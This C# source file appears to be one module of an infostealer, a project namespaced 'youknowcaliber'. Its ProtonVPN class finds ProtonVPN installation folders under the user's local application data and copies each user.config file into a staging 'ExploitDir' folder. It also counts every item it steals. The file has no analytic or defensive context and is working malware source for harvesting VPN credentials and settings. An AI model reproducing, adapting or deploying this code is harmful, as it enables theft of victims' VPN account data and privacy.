﻿using System;
using System.IO;

namespace youknowcaliber
{
	internal class ProtonVPN
	{
		public static void Save()
		{
			string exploitDir = Help.ExploitDir;
			string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "ProtonVPN");
			bool flag = !Directory.Exists(path);
			if (!flag)
			{
				try
				{
					foreach (string text in Directory.GetDirectories(path))
					{
						bool flag2 = text.Contains("ProtonVPN.exe");
						if (flag2)
						{
							foreach (string str in Directory.GetDirectories(text))
							{
								string text2 = str + "\\user.config";
								string text3 = Path.Combine(exploitDir + "\\VPN\\ProtonVPN", new DirectoryInfo(Path.GetDirectoryName(text2)).Name);
								bool flag3 = !Directory.Exists(text3);
								if (flag3)
								{
									Directory.CreateDirectory(text3);
									File.Copy(text2, text3 + "\\user.config");
									Counting.ProtonVPN++;
								}
							}
						}
					}
				}
				catch (Exception value)
				{
					Console.WriteLine(value);
				}
			}
		}
	}
}
